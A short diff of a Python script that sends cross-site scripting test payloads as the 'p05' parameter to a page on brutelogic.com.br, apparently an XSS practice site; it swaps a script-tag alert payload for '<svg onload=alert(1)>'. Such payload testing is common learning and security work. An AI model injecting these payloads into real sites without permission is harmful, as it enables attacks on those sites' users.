@@ -3,7 +3,8 @@ import requests
 
 url = 'https://brutelogic.com.br/gym.php'
 
-payload = '</h1><script>alert(1+2)</script>'
+# payload = '</h1><script>alert(1+2)</script>'
+payload = '<svg onload=alert(1)>'
 
 params = {'p05': payload}
 
